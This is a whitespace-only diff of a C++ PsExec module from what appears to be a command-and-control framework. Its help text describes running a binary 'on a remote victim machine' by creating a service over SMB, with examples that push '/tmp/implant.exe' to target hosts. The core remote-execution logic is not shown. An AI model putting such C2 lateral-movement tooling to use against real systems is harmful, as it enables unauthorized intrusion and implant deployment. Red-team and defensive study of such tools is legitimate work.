@@ -49,9 +49,9 @@ __attribute__((visibility("default"))) PsExec* PsExecConstructor()
 
 PsExec::PsExec()
 #ifdef BUILD_TEAMSERVER
-	: ModuleCmd(std::string(moduleName), moduleHash)
+    : ModuleCmd(std::string(moduleName), moduleHash)
 #else
-	: ModuleCmd("", moduleHash)
+    : ModuleCmd("", moduleHash)
 #endif
 {
     srand(time(NULL));
@@ -65,7 +65,7 @@ PsExec::~PsExec()
 
 std::string PsExec::getInfo()
 {
-	std::string info;
+    std::string info;
 #ifdef BUILD_TEAMSERVER
     info += "PsExec Module:\n";
     info += "Execute a binary on a remote victim machine by creating a service via an SMB share.\n";
@@ -75,39 +75,39 @@ std::string PsExec::getInfo()
     info += "- psExec m3dc.cyber.local /tmp/implant.exe\n";
     info += "- psExec 10.9.20.10 /tmp/implant.exe\n";
 #endif
-	return info;
+    return info;
 }
 
 
 int PsExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
    if (splitedCmd.size() >= 3)
-	{
+    {
         string scmServer = splitedCmd[1];
-		string inputFile = splitedCmd[2];
+        string inputFile = splitedCmd[2];
 
-		std::ifstream input(inputFile, std::ios::binary);
-		if( input ) 
-		{
-			std::string buffer(std::istreambuf_iterator<char>(input), {});
+        std::ifstream input(inputFile, std::ios::binary);
+        if( input ) 
+        {
+            std::string buffer(std::istreambuf_iterator<char>(input), {});
 
-			c2Message.set_instruction(splitedCmd[0]);
-			c2Message.set_inputfile(inputFile);
-			c2Message.set_cmd(scmServer);
-			c2Message.set_data(buffer.data(), buffer.size());
-			}
-		else
-		{
-			c2Message.set_returnvalue("Failed: Couldn't open file.");
-			return -1;
-		}
+            c2Message.set_instruction(splitedCmd[0]);
+            c2Message.set_inputfile(inputFile);
+            c2Message.set_cmd(scmServer);
+            c2Message.set_data(buffer.data(), buffer.size());
+            }
+        else
+        {
+            c2Message.set_returnvalue("Failed: Couldn't open file.");
+            return -1;
+        }
 
-	}
-	else
-	{
-		c2Message.set_returnvalue(getInfo());
-		return -1;
-	}
+    }
+    else
+    {
+        c2Message.set_returnvalue(getInfo());
+        return -1;
+    }
 
 #ifdef __linux__ 
 
@@ -115,7 +115,7 @@ int PsExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 #endif
 
-	return 0;
+    return 0;
 }
 
 
@@ -137,7 +137,7 @@ std::string randomName( size_t length )
 
 int PsExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
-	const std::string cmd = c2Message.cmd();
+    const std::string cmd = c2Message.cmd();
 
     std::vector<std::string> splitedList;
     splitList(cmd, ";", splitedList);
@@ -189,10 +189,10 @@ int PsExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 #endif
 
-	c2RetMessage.set_instruction(c2RetMessage.instruction());
-	c2RetMessage.set_cmd(cmd);
-	c2RetMessage.set_returnvalue(result);
-	return 0;
+    c2RetMessage.set_instruction(c2RetMessage.instruction());
+    c2RetMessage.set_cmd(cmd);
+    c2RetMessage.set_returnvalue(result);
+    return 0;
 }
 
 
